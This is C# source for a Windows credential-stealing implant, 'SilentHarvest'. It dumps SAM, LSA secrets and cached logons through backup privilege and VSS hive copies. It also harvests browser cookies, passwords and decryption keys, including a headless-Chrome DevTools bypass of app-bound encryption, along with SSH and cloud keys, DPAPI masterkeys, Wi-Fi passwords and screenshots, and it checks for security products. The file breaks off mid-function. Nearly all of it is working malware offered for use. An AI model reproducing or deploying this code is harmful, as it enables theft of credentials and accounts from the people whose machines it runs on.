// silent-harvest implant — collection stages
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace SilentHarvest
{
    public class Part
    {
        public string Name;
        public byte[] Data;
        public string MetaJson; // raw json object or "null"
        public Part(string name, byte[] data, string meta)
        {
            Name = name; Data = data; MetaJson = meta ?? "null";
        }
    }

    public static class Stages
    {
        // ------------------------------------------------------------ privileges
        public static bool IsElevated()
        {
            IntPtr tok;
            if (!Native.OpenProcessToken(Native.GetCurrentProcess(), Native.TOKEN_QUERY, out tok))
                return false;
            try
            {
                int len;
                Native.GetTokenInformation(tok, Native.TokenElevation, IntPtr.Zero, 0, out len);
                IntPtr buf = Marshal.AllocHGlobal(8);
                try
                {
                    if (!Native.GetTokenInformation(tok, Native.TokenElevation, buf, 8, out len))
                        return false;
                    return Marshal.ReadInt32(buf) != 0;
                }
                finally { Marshal.FreeHGlobal(buf); }
            }
            finally { Native.CloseHandle(tok); }
        }

        public static bool EnableBackupPrivilege()
        {
            IntPtr tok;
            if (!Native.OpenProcessToken(Native.GetCurrentProcess(),
                    Native.TOKEN_ADJUST_PRIVILEGES | Native.TOKEN_QUERY, out tok))
                return false;
            try
            {
                Native.LUID luid = new Native.LUID();
                if (!Native.LookupPrivilegeValueW(null, "SeBackupPrivilege", ref luid))
                    return false;
                Native.TOKEN_PRIVILEGES tp = new Native.TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privilege.Luid = luid;
                tp.Privilege.Attributes = Native.SE_PRIVILEGE_ENABLED;
                if (!Native.AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
                    return false;
                return Marshal.GetLastWin32Error() != Native.ERROR_NOT_ALL_ASSIGNED;
            }
            finally { Native.CloseHandle(tok); }
        }

        // ------------------------------------------------------------ registry
        // The "Silent Harvest" technique: open protected keys with
        // NtOpenKeyEx(REG_OPTION_BACKUP_RESTORE) under SeBackupPrivilege and
        // bulk-read values via RegQueryMultipleValuesW.
        public static string RegistryStage(List<Part> parts)
        {
            Util.JsonObj doc = new Util.JsonObj();
            int keysRead = 0;

            // 1) resolve current control set (readable by everyone)
            Dictionary<string, object> sel = Util.ReadKeyValues(
                @"\Registry\Machine\SYSTEM\Select",
                new string[] { "Current", "Default", "Failed", "LastKnownGood" });
            int ccs = 1;
            if ("OK".Equals(sel["_status"]))
            {
                object cur;
                if (sel.TryGetValue("#Current", out cur) && ((byte[])cur).Length >= 4)
                    ccs = BitConverter.ToInt32((byte[])cur, 0);
                AddKey(doc, @"HKLM\SYSTEM\Select", sel);
                keysRead++;
            }
            string cs = "ControlSet" + ccs.ToString("D3");
            Util.Log("current control set: {0}", cs);

            // 2) bootkey components: stored as the CLASS names of
            //    Lsa\{JD,Skew1,GBG,Data} (readable) — also proves the
            //    NtOpenKeyEx + backup-intent path works on this host
            string[] bk = new string[] { "JD", "Skew1", "GBG", "Data" };
            foreach (string k in bk)
            {
                Dictionary<string, object> r = Util.ReadKeyClass(
                    @"\Registry\Machine\SYSTEM\" + cs + @"\Control\Lsa\" + k);
                AddKey(doc, @"HKLM\SYSTEM\" + cs + @"\Control\Lsa\" + k, r);
                keysRead++;
            }

            // 3) SAM: account F + per-RID F values (requires SeBackupPrivilege)
            Dictionary<string, object> acct = Util.ReadKeyValues(
                @"\Registry\Machine\SAM\SAM\Domains\Account",
                new string[] { "F" });
            AddKey(doc, @"HKLM\SAM\SAM\Domains\Account", acct);
            keysRead++;
            Util.Log("SAM account F: {0}", acct["_status"]);

            if ("OK".Equals(acct["_status"]))
            {
                string users;
                List<string> rids = Util.EnumSubKeysOfNt(
                    @"\Registry\Machine\SAM\SAM\Domains\Account\Users", out users);
                Util.Log("SAM rids: {0} ({1})", rids.Count, users);
                foreach (string rid in rids)
                {
                    if (rid.Length != 8) continue; // "000001F4" style, skip "Names"
                    Dictionary<string, object> r = Util.ReadKeyValues(
                        @"\Registry\Machine\SAM\SAM\Domains\Account\Users\" + rid,
                        new string[] { "F", "V" });
                    AddKey(doc, @"HKLM\SAM\SAM\Domains\Account\Users\" + rid, r);
                    keysRead++;
                }
            }

            // 4) SECURITY: LSA secrets + cached domain logons
            string secretsStatus;
            List<string> secrets = Util.EnumSubKeysOfNt(
                @"\Registry\Machine\SECURITY\Policy\Secrets", out secretsStatus);
            Util.Log("LSA secrets: {0} ({1})", secrets.Count, secretsStatus);
            int secretsRead = 0;
            foreach (string s in secrets)
            {
                if (s.StartsWith("NL$Control")) continue;
                // CurrVal holds one unnamed (default) value
                Dictionary<string, object> r = Util.ReadKeyValues(
                    @"\Registry\Machine\SECURITY\Policy\Secrets\" + s + @"\CurrVal",
                    new string[] { "" });
                AddKey(doc, @"HKLM\SECURITY\Policy\Secrets\" + s + @"\CurrVal", r);
                keysRead++;
                if ("OK".Equals(r["_status"])) secretsRead++;
            }
            if (secretsStatus != null)
                doc.Add("_secrets_enum", secretsStatus);

            Dictionary<string, object> cache = Util.ReadKeyValues(
                @"\Registry\Machine\SECURITY\Cache",
                new string[] { "NL$1", "NL$2", "NL$3", "NL$4", "NL$5",
                               "NL$6", "NL$7", "NL$8", "NL$9", "NL$10", "NL$Control" });
            AddKey(doc, @"HKLM\SECURITY\Cache", cache);
            keysRead++;

            byte[] json = Encoding.UTF8.GetBytes(doc.ToString());
            parts.Add(new Part("regvals.json", json,
                new Util.JsonObj().Add("keys", keysRead.ToString())
                                  .Add("secrets_read", secretsRead.ToString()).ToString()));
            return "keys=" + keysRead + " secrets=" + secretsRead;
        }

        private static void AddKey(Util.JsonObj doc, string path, Dictionary<string, object> vals)
        {
            Util.JsonObj keyObj = new Util.JsonObj();
            foreach (KeyValuePair<string, object> kv in vals)
            {
                if (kv.Key.StartsWith("#"))
                {
                    string baseName = kv.Key.Substring(1);
                    int[] tl = (int[])vals[baseName];
                    keyObj.AddRaw(baseName, string.Format(
                        "{{\"type\":{0},\"len\":{1},\"b64\":\"{2}\"}}",
                        tl[0], tl[1], Util.B64((byte[])kv.Value)));
                }
                else if (!kv.Key.StartsWith("_"))
                {
                    int[] tl = kv.Value as int[];
                    if (tl != null) continue; // covered by the # entry
                }
            }
            object st;
            if (vals.TryGetValue("_status", out st))
                keyObj.Add("_status", (string)st);
            doc.AddRaw(path, keyObj.ToString());
        }

        // ------------------------------------------------------------ hives
        // Full-hive copies via VSS through the in-box esentutl (needs elevation).
        public static string HiveStage(List<Part> parts)
        {
            string[] hives = new string[] { "SAM", "SECURITY", "SYSTEM" };
            int ok = 0;
            string tempDir = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName()
                .Replace(".", ""));
            Directory.CreateDirectory(tempDir);
            try
            {
                foreach (string h in hives)
                {
                    string src = Path.Combine(@"C:\Windows\System32\config", h);
                    string dst = Path.Combine(tempDir, h);
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo("esentutl.exe",
                            "/y /vss \"" + src + "\" /d \"" + dst + "\"");
                        psi.CreateNoWindow = true;
                        psi.UseShellExecute = false;
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        Process p = Process.Start(psi);
                        if (!p.WaitForExit(60000)) { try { p.Kill(); } catch { } }
                        if (p.ExitCode == 0 && File.Exists(dst))
                        {
                            byte[] data = File.ReadAllBytes(dst);
                            parts.Add(new Part("hive:" + h, data,
                                new Util.JsonObj().Add("src", src).Add("method", "esentutl/vss").ToString()));
                            ok++;
                            Util.Log("hive {0}: {1} bytes via VSS", h, data.Length);
                        }
                        else
                        {
                            Util.Log("hive {0}: esentutl rc={1}", h, p.ExitCode);
                        }
                    }
                    catch (Exception e) { Util.Log("hive {0}: {1}", h, e.Message); }
                    finally { try { if (File.Exists(dst)) File.Delete(dst); } catch { } }
                }
            }
            finally
            {
                try { Directory.Delete(tempDir, true); } catch { }
            }
            return "hives=" + ok + "/3";
        }

        // ------------------------------------------------------------ browsers
        private static string[][] Browsers()
        {
            return new string[][]
            {
                new string[] { "chrome",  @"Google\Chrome\User Data" },
                new string[] { "edge",    @"Microsoft\Edge\User Data" },
                new string[] { "brave",   @"BraveSoftware\Brave-Browser\User Data" },
                new string[] { "chromium", @"Chromium\User Data" },
                new string[] { "vivaldi", @"Vivaldi\User Data" },
                new string[] { "opera",   @"Opera Software\Opera Stable" },
                new string[] { "opera-gx",@"Opera Software\Opera GX Stable" },
            };
        }

        public static string BrowserStage(List<Part> parts)
        {
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            int nParts = 0, nProfiles = 0;

            foreach (string[] b in Browsers())
            {
                string name = b[0];
                string ud = Path.Combine(localAppData, b[1]);
                if (!Directory.Exists(ud)) continue;

                // Local State: DPAPI-wrapped AES key for v10/v11 blobs
                string lsPath = Path.Combine(ud, "Local State");
                if (File.Exists(lsPath))
                {
                    try
                    {
                        byte[] ls = Util.ReadFileLoose(lsPath);
                        if (ls != null)
                        {
                            parts.Add(new Part("b:" + name + "/LocalState", ls,
                                new Util.JsonObj().Add("path", lsPath).ToString()));
                            nParts++;

                            string lsTxt = Encoding.UTF8.GetString(ls);
                            Match m = Regex.Match(lsTxt, "\"encrypted_key\"\\s*:\\s*\"([A-Za-z0-9+/=]+)\"");
                            if (m.Success)
                            {
                                byte[] blob = Convert.FromBase64String(m.Groups[1].Value);
                                // strip the 5-byte "DPAPI" prefix before unwrapping
                                byte[] toUnprotect = blob;
                                if (blob.Length > 5 && blob[0] == (byte)'D' && blob[1] == (byte)'P'
                                    && blob[2] == (byte)'A' && blob[3] == (byte)'P' && blob[4] == (byte)'I')
                                    toUnprotect = Slice(blob, 5, blob.Length - 5);
                                byte[] key = DpapiUnprotect(toUnprotect);
                                if (key != null && key.Length >= 32)
                                {
                                    byte[] k32 = new byte[32];
                                    Buffer.BlockCopy(key, key.Length - 32, k32, 0, 32);
                                    parts.Add(new Part("b:" + name + "/aeskey.bin", k32,
                                        new Util.JsonObj().Add("src", "os_crypt.encrypted_key").ToString()));
                                    nParts++;
                                    Util.Log("{0}: os_crypt key recovered ({1}B)", name, key.Length);
                                }
                                else
                                {
                                    parts.Add(new Part("b:" + name + "/key_status.txt",
                                        Encoding.UTF8.GetBytes("dpapi_unwrap_failed len=" +
                                            (toUnprotect == null ? -1 : toUnprotect.Length)), null));
                                    Util.Log("{0}: dpapi unwrap FAILED", name);
                                }
                            }
                            Match abe = Regex.Match(lsTxt, "\"app_bound_encrypted_key\"\\s*:\\s*\"([A-Za-z0-9+/=]+)\"");
                            if (abe.Success)
                            {
                                byte[] abeBlob = Convert.FromBase64String(abe.Groups[1].Value);
                                parts.Add(new Part("b:" + name + "/ABEblob.bin", abeBlob,
                                    new Util.JsonObj().Add("src", "app_bound_encrypted_key").ToString()));
                                nParts++;
                            }
                        }
                    }
                    catch (Exception e) { Util.Log("{0}: localstate {1}", name, e.Message); }
                }

                // profiles
                List<string> profiles = new List<string>();
                try
                {
                    foreach (string d in Directory.GetDirectories(ud))
                    {
                        string dn = Path.GetFileName(d);
                        if (dn == "Default" || dn.StartsWith("Profile ")) profiles.Add(dn);
                    }
                }
                catch { }
                if (profiles.Count == 0 && File.Exists(Path.Combine(ud, "Cookies")))
                    profiles.Add(".");

                foreach (string prof in profiles)
                {
                    nProfiles++;
                    string pd = prof == "." ? ud : Path.Combine(ud, prof);
                    string[][] files = new string[][]
                    {
                        // v114+ moved cookies under Network\; older builds keep it in profile root
                        new string[] { "Cookies",  Path.Combine(pd, @"Network\Cookies") },
                        new string[] { "Cookies2", Path.Combine(pd, "Cookies") },
                        new string[] { "LoginData", Path.Combine(pd, "Login Data") },
                        // synced Google-account passwords live here (GPM), not in Login Data
                        new string[] { "LoginDataAcct", Path.Combine(pd, "Login Data For Account") },
                        new string[] { "WebData",  Path.Combine(pd, "Web Data") },
                        new string[] { "History",  Path.Combine(pd, "History") },
                    };
                    foreach (string[] f in files)
                    {
                        if (!File.Exists(f[1])) continue;
                        byte[] data = Util.ReadFileLoose(f[1]);
                        string method = "file";
                        if (data == null)
                        {
                            // exclusive lock (Chrome holds Cookies this way while
                            // running) — try duplicating the owner's handle
                            string rel;
                            if (f[0] == "Cookies") rel = @"Network\Cookies";
                            else if (f[0] == "Cookies2") rel = "Cookies";
                            else if (f[0] == "LoginData") rel = "Login Data";
                            else if (f[0] == "LoginDataAcct") rel = "Login Data For Account";
                            else if (f[0] == "WebData") rel = "Web Data";
                            else rel = "History";
                            if (prof != ".")
                            {
                                string suffix = b[1] + "\\" + prof + "\\" + rel;
                                data = Util.ReadFileViaHandleDup(suffix);
                                if (data != null) method = "handle-dup";
                            }
                        }
                        if (data == null)
                        {
                            Util.Log("{0}/{1}/{2}: read failed (locked)", name, prof, f[0]);
                            continue;
                        }
                        parts.Add(new Part("b:" + name + "/" + prof + "/" + f[0], data,
                            new Util.JsonObj().Add("path", f[1]).Add("size", data.Length.ToString())
                                              .Add("method", method).ToString()));
                        nParts++;
                        Util.Log("{0}/{1}/{2}: {3} bytes ({4})", name, prof, f[0], data.Length, method);
                    }

                    // Local Storage leveldb: site tokens/JWTs live here, not app-bound
                    try
                    {
                        string lsDir = Path.Combine(pd, @"Local Storage\leveldb");
                        if (Directory.Exists(lsDir))
                        {
                            foreach (string f in Directory.GetFiles(lsDir))
                            {
                                if (!f.EndsWith(".log") && !f.EndsWith(".ldb")) continue;
                                byte[] data = Util.ReadFileLoose(f);
                                if (data == null || data.Length > 2 * 1024 * 1024) continue;
                                parts.Add(new Part(
                                    "b:" + name + "/" + prof + "/LocalStorage/" + Path.GetFileName(f),
                                    data, new Util.JsonObj().Add("path", f).ToString()));
                                nParts++;
                            }
                        }
                    }
                    catch { }
                }
            }

            // firefox
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string ffRoot = Path.Combine(appData, @"Mozilla\Firefox\Profiles");
            if (Directory.Exists(ffRoot))
            {
                foreach (string d in Directory.GetDirectories(ffRoot))
                {
                    string pn = Path.GetFileName(d);
                    string[] ffFiles = new string[] { "key4.db", "logins.json", "logins.db", "cert9.db" };
                    foreach (string f in ffFiles)
                    {
                        string fp = Path.Combine(d, f);
                        if (!File.Exists(fp)) continue;
                        byte[] data = Util.ReadFileLoose(fp);
                        if (data == null) continue;
                        parts.Add(new Part("ff:" + pn + "/" + f, data,
                            new Util.JsonObj().Add("path", fp).Add("size", data.Length.ToString()).ToString()));
                        nParts++;
                    }
                }
            }
            return "parts=" + nParts + " profiles=" + nProfiles;
        }

        // ------------------------------------------------------------ DPAPI
        private static byte[] Slice(byte[] src, int off, int len)
        {
            byte[] dst = new byte[len];
            Buffer.BlockCopy(src, off, dst, 0, len);
            return dst;
        }

        public static byte[] DpapiUnprotect(byte[] blob)
        {
            Native.DATA_BLOB inBlob = new Native.DATA_BLOB();
            Native.DATA_BLOB outBlob = new Native.DATA_BLOB();
            GCHandle h = GCHandle.Alloc(blob, GCHandleType.Pinned);
            try
            {
                inBlob.cbData = blob.Length;
                inBlob.pbData = h.AddrOfPinnedObject();
                if (!Native.CryptUnprotectData(ref inBlob, null, IntPtr.Zero, IntPtr.Zero,
                                               IntPtr.Zero, 0, ref outBlob))
                    return null;
                byte[] outData = new byte[outBlob.cbData];
                Marshal.Copy(outBlob.pbData, outData, 0, outBlob.cbData);
                Native.LocalFree(outBlob.pbData);
                return outData;
            }
            finally { h.Free(); }
        }


        // ------------------------------------------------------------ keys & cloud
        // plaintext credential files under the user profile - never app-bound
        public static string KeysStage(List<Part> parts)
        {
            string home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            int n = 0;
            string[][] targets = new string[][]
            {
                new string[] { "ssh",    Path.Combine(home, ".ssh") },
                new string[] { "aws",    Path.Combine(home, ".aws") },
                new string[] { "kube",   Path.Combine(home, ".kube") },
                new string[] { "azure",  Path.Combine(home, ".azure") },
                new string[] { "gcloud", Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "gcloud") },
            };
            foreach (string[] t in targets)
            {
                if (!Directory.Exists(t[1])) continue;
                try
                {
                    foreach (string f in Directory.GetFiles(t[1], "*", SearchOption.AllDirectories))
                    {
                        byte[] data = Util.ReadFileLoose(f);
                        if (data == null) continue;
                        string rel = f.Substring(t[1].Length + 1);
                        parts.Add(new Part("win:key/" + t[0] + "/" + rel, data,
                            new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
                        n++;
                    }
                }
                catch { }
            }
            string[][] files = new string[][]
            {
                new string[] { "netrc",           Path.Combine(home, ".netrc") },
                new string[] { "git-credentials", Path.Combine(home, ".git-credentials") },
                new string[] { "docker-config",   Path.Combine(home, @".docker\config.json") },
                new string[] { "npmrc",           Path.Combine(home, ".npmrc") },
                new string[] { "pypirc",          Path.Combine(home, ".pypirc") },
            };
            foreach (string[] f in files)
            {
                byte[] data = Util.ReadFileLoose(f[1]);
                if (data == null) continue;
                parts.Add(new Part("win:key/" + f[0], data, new Util.JsonObj().Add("path", f[1]).ToString()));
                n++;
            }
            return "keys=" + n;
        }

        // ------------------------------------------------------------ DPAPI vault
        // raw material: DPAPI masterkeys + Credential Manager vault blobs +
        // FTP client configs with legacy-obfuscated passwords
        public static string VaultStage(List<Part> parts, bool elevated)
        {
            int n = 0;
            string roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string windir = Environment.GetFolderPath(Environment.SpecialFolder.System);

            string[][] dirs = new string[][]
            {
                new string[] { "protect",       Path.Combine(roaming, @"Microsoft\Protect") },
                new string[] { "vault-local",   Path.Combine(local,   @"Microsoft\Vault") },
                new string[] { "vault-roaming", Path.Combine(roaming, @"Microsoft\Vault") },
                new string[] { "filezilla",     Path.Combine(roaming, @"FileZilla") },
            };
            foreach (string[] d in dirs)
            {
                if (!Directory.Exists(d[1])) continue;
                try
                {
                    foreach (string f in Directory.GetFiles(d[1], "*", SearchOption.AllDirectories))
                    {
                        byte[] data = Util.ReadFileLoose(f);
                        if (data == null || data.Length > 2 * 1024 * 1024) continue;
                        string rel = f.Substring(d[1].Length + 1).Replace('\\', '_');
                        parts.Add(new Part("win:" + d[0] + "/" + rel, data,
                            new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
                        n++;
                    }
                }
                catch { }
            }

            // machine-scope DPAPI masterkeys (S-1-5-18): with these + user
            // masterkeys, every offline unwrap works — vault blobs and the
            // SYSTEM layer of app-bound keys. Requires elevation.
            if (elevated)
            {
                string[] mdirs = new string[]
                {
                    Path.Combine(windir, @"Microsoft\Protect"),
                    Path.Combine(windir, @"Microsoft\Protect\S-1-5-18"),
                    Path.Combine(windir, @"Microsoft\Protect\S-1-5-18\User"),
                    Path.Combine(windir, @"Microsoft\Protect\S-1-5-18\Preferred"),
                };
                foreach (string md in mdirs)
                {
                    if (!Directory.Exists(md)) continue;
                    try
                    {
                        foreach (string f in Directory.GetFiles(md, "*", SearchOption.AllDirectories))
                        {
                            byte[] data = Util.ReadFileLoose(f);
                            if (data == null || data.Length > 1024 * 1024) continue;
                            string rel = f.Substring(f.IndexOf("Protect")).Replace('\\', '_');
                            if (parts.Exists(delegate(Part pp) { return pp.Name == "win:mprotect/" + rel; })) continue;
                            parts.Add(new Part("win:mprotect/" + rel, data,
                                new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
                            n++;
                        }
                    }
                    catch { }
                }
            }

            // CNG machine key files (Chrome ABE Chromekey1/2 live here) --
            // the last artifact needed for fully-offline v20 decryption
            if (elevated)
            {
                try
                {
                    string skDir = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                        @"Microsoft\Crypto\SystemKeys");
                    if (Directory.Exists(skDir))
                        foreach (string f in Directory.GetFiles(skDir))
                        {
                            byte[] data = Util.ReadFileLoose(f);
                            if (data == null || data.Length > 1024 * 1024) continue;
                            parts.Add(new Part("win:systemkeys/" + Path.GetFileName(f), data,
                                new Util.JsonObj().Add("path", f).Add("size", data.Length.ToString()).ToString()));
                            n++;
                        }
                }
                catch { }
            }

            // RDP server hints (readable registry, no elevation needed)
            try
            {
                Microsoft.Win32.RegistryKey k =
                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Terminal Server Client\Servers");
                if (k != null)
                {
                    System.Text.StringBuilder sb = new System.Text.StringBuilder();
                    foreach (string sub in k.GetSubKeyNames())
                    {
                        string hint = (string)k.OpenSubKey(sub).GetValue("UsernameHint", "");
                        sb.Append(sub).Append('\t').Append(hint).Append('\n');
                    }
                    if (sb.Length > 0)
                    {
                        parts.Add(new Part("win:rdp-hints",
                            System.Text.Encoding.UTF8.GetBytes(sb.ToString()),
                            new Util.JsonObj().Add("count", k.GetSubKeyNames().Length.ToString()).ToString()));
                        n++;
                    }
                }
            }
            catch { }

            // PuTTY saved sessions (hostnames/users - recon for key reuse)
            try
            {
                Microsoft.Win32.RegistryKey k =
                    Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                        @"Software\SimonTatham\PuTTY\Sessions");
                if (k != null)
                {
                    System.Text.StringBuilder sb = new System.Text.StringBuilder();
                    foreach (string sub in k.GetSubKeyNames())
                    {
                        Microsoft.Win32.RegistryKey sk = k.OpenSubKey(sub);
                        sb.Append(sub).Append('\t')
                          .Append(sk.GetValue("HostName", "")).Append('\t')
                          .Append(sk.GetValue("UserName", "")).Append('\n');
                    }
                    if (sb.Length > 0)
                    {
                        parts.Add(new Part("win:putty-sessions",
                            System.Text.Encoding.UTF8.GetBytes(sb.ToString()), null));
                        n++;
                    }
                }
            }
            catch { }
            return "vault=" + n;
        }

        // ------------------------------------------------------------ wifi
        public static string WifiStage(List<Part> parts, bool elevated)
        {
            try
            {
                System.Text.StringBuilder sb = new System.Text.StringBuilder();
                ProcessStartInfo psi = new ProcessStartInfo("netsh", "wlan show profiles");
                psi.CreateNoWindow = true; psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                Process p = Process.Start(psi);
                string list = p.StandardOutput.ReadToEnd();
                p.WaitForExit(10000);
                sb.Append(list);
                foreach (string line in list.Split('\n'))
                {
                    int i = line.IndexOf(':');
                    if (i < 0 || !line.Contains("Profile")) continue;
                    string name = line.Substring(i + 1).Trim();
                    if (name.Length == 0 || !elevated) continue;
                    ProcessStartInfo psi2 = new ProcessStartInfo("netsh",
                        "wlan show profile name=\"" + name + "\" key=clear");
                    psi2.CreateNoWindow = true; psi2.UseShellExecute = false;
                    psi2.RedirectStandardOutput = true;
                    Process p2 = Process.Start(psi2);
                    sb.Append(p2.StandardOutput.ReadToEnd());
                    p2.WaitForExit(10000);
                }
                byte[] data = System.Text.Encoding.UTF8.GetBytes(sb.ToString());
                parts.Add(new Part("win:wifi", data,
                    new Util.JsonObj().Add("elevated", elevated ? "true" : "false").ToString()));
                return "wifi=ok(" + (elevated ? "keys" : "names-only") + ")";
            }
            catch (Exception e) { Util.Log("wifi stage: {0}", e.Message); return "wifi=fail"; }
        }

        // ------------------------------------------------------------ screenshot
        public static byte[] ScreenshotPng()
        {
            try
            {
                System.Drawing.Rectangle bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds;
                using (System.Drawing.Bitmap bmp = new System.Drawing.Bitmap(bounds.Width, bounds.Height))
                {
                    using (System.Drawing.Graphics g = System.Drawing.Graphics.FromImage(bmp))
                        g.CopyFromScreen(bounds.Location, System.Drawing.Point.Empty, bounds.Size);
                    using (System.IO.MemoryStream ms = new System.IO.MemoryStream())
                    {
                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                        return ms.ToArray();
                    }
                }
            }
            catch (Exception e) { Util.Log("screenshot: {0}", e.Message); return null; }
        }

        // ------------------------------------------------------------ recon
        private static readonly string[] EDR_NAMES = new string[]
        {
            "MsMpEng", "NisSrv", "CrowdStrike", "CSFalcon", "SentinelAgent",
            "SentinelServiceHost", "Cybereason", "Tanium", "carbonblack",
            "xagt", "SophosHealth", "esensor", "osqueryd", "wazuh", "Sysmon",
            "ekrn", "avp", "kavfs", "masvc", "McAfee", "bdagent", "360tray",
            "Traps", "panhlpsvc", "dsmonitor", "SafeService",
        };

        public static string EdrScan(List<Part> parts)
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            try
            {
                foreach (Process proc in Process.GetProcesses())
                {
                    string name = proc.ProcessName.ToLowerInvariant();
                    foreach (string edr in EDR_NAMES)
                    {
                        if (name.Contains(edr.ToLowerInvariant()))
                        {
                            sb.Append(proc.ProcessName).Append('\n');
                            break;
                        }
                    }
                }
            }
            catch { }
            string hits = sb.ToString();
            parts.Add(new Part("win:edr", System.Text.Encoding.UTF8.GetBytes(
                hits.Length > 0 ? hits : "none detected\n"), null));
            return hits.Length > 0 ? ("edr=" + hits.Replace("\n", ",").TrimEnd(',')) : "edr=none";
        }


        // ------------------------------------------------------------ devtools
        // ABE bypass via the browser itself (T1555.003 / T1539): spawn the
        // genuine signed chrome.exe headless against a shadow copy of the
        // profile; Chrome decrypts v20 app-bound cookies through its own
        // elevation service, and we dump them via the DevTools protocol.
        public static string DevToolsStage(List<Part> parts)
        {
            string lad = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string[][] cands = new string[][]
            {
                new string[] { "chrome", FindBrowserExe("chrome.exe",
                    @"Google\Chrome\Application\chrome.exe"),
                    Path.Combine(lad, @"Google\Chrome\User Data") },
                new string[] { "edge", FindBrowserExe("msedge.exe",
                    @"Microsoft\Edge\Application\msedge.exe"),
                    Path.Combine(lad, @"Microsoft\Edge\User Data") },
                new string[] { "brave", FindBrowserExe("brave.exe",
                    @"BraveSoftware\Brave-Browser\Application\brave.exe"),
                    Path.Combine(lad, @"BraveSoftware\Brave-Browser\User Data") },
            };
            int done = 0;
            foreach (string[] c in cands)
            {
                if (c[1] == null || !File.Exists(c[1]) || !Directory.Exists(c[2])) continue;
                try
                {
                    byte[] cookies = DevToolsDumpCookies(c[1], c[2]);
                    if (cookies != null && cookies.Length > 40)
                    {
                        parts.Add(new Part("b:" + c[0] + "/devtools_cookies.json", cookies,
                            new Util.JsonObj().Add("method", "cdp Network.getAllCookies").ToString()));
                        done++;
                        Util.Log("{0}: devtools dump {1} bytes", c[0], cookies.Length);
                    }
                }
                catch (Exception e) { Util.Log("{0}: devtools failed: {1}", c[0], e.Message); }
            }
            return "devtools=" + done;
        }

        private static string FindBrowserExe(string exe, string relPath)
        {
            string[] roots = new string[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            };
            foreach (string r in roots)
            {
                if (string.IsNullOrEmpty(r)) continue;
                string p = Path.Combine(Path.Combine(r, relPath.Split('\\')[0]),
                                        string.Join("\\", relPath.Split('\\'), 1, relPath.Split('\\').Length - 1));
                if (File.Exists(p)) return p;
            }
            // App Paths registry fallback
            try
            {
                object v = Microsoft.Win32.Registry.LocalMachine
                    .OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\" + exe)
                    .GetValue("");
                if (v != null && File.Exists(v.ToString())) return v.ToString();
            }
            catch { }
            return null;
        }

        private static byte[] DevToolsDumpCookies(string exe, string userData)
        {
            string tempRoot = Path.Combine(Path.GetTempPath(),
                "sh_dt_" + Guid.NewGuid().ToString("N").Substring(0, 10));
            string ud = Path.Combine(tempRoot, "ud");
            Process proc = null;
            try
            {
                // shadow profile: the files Chrome needs to decrypt the store
                Directory.CreateDirectory(Path.Combine(ud, "Default", "Network"));
                byte[] ls = Util.ReadFileLoose(Path.Combine(userData, "Local State"));
                if (ls == null) return null;
                File.WriteAllBytes(Path.Combine(ud, "Local State"), ls);
                string[][] copies = new string[][]
                {
                    new string[] { Path.Combine(userData, "Default", "Network", "Cookies"),
                                   Path.Combine(ud, "Default", "Network", "Cookies") },
                    new string[] { Path.Combine(userData, "Default", "Network", "Login Data"),
                                   Path.Combine(ud, "Default", "Network", "Login Data") },
                    new string[] { Path.Combine(userData, "Default", "Login Data"),
                                   Path.Combine(ud, "Default", "Login Data") },
                    new string[] { Path.Combine(userData, "Default", "Web Data"),
                                   Path.Combine(ud, "Default", "Web Data") },
                };
                foreach (string[] cp in copies)
                {
                    if (!File.Exists(cp[0])) continue;
                    byte[] d = Util.ReadFileLoose(cp[0]);
                    if (d == null)
                        d = Util.ReadFileViaHandleDup(FileSuffixFromUserData(userData, cp[0]));
                    if (d != null) File.WriteAllBytes(cp[1], d);
                }

                ProcessStartInfo psi = new ProcessStartInfo(exe,
                    "--headless=new --remote-debugging-port=0 --user-data-dir=\"" + ud + "\" " +
                    "--no-first-run --no-default-browser-check --disable-gpu " +
                    "--disable-extensions --remote-allow-origins=* about:blank");
                psi.CreateNoWindow = true;
                psi.UseShellExecute = false;
                psi.RedirectStandardError = true;
                psi.RedirectStandardOutput = true;   // some builds print the banner here
                proc = Process.Start(psi);

                string wsUrl = null;
                // line-wise readers: ReadToEnd blocks until exit, so we would
                // never see the banner while headless chrome is running
                string allErr = "";
                object box = new object();
                System.Threading.ParameterizedThreadStart reader = delegate(object sr)
                {
                    try
                    {
                        System.IO.StreamReader r = (System.IO.StreamReader)sr;
                        string ln;
                        while ((ln = r.ReadLine()) != null)
                            lock (box) { allErr += ln + "\n"; }
                    }
                    catch { }
                };
                System.Threading.Thread worker = new System.Threading.Thread(reader);
                worker.IsBackground = true;
                worker.Start(proc.StandardError);
                System.Threading.Thread worker2 = new System.Threading.Thread(reader);
                worker2.IsBackground = true;
                worker2.Start(proc.StandardOutput);
                for (int i = 0; i < 150; i++)   // up to 15s
                {
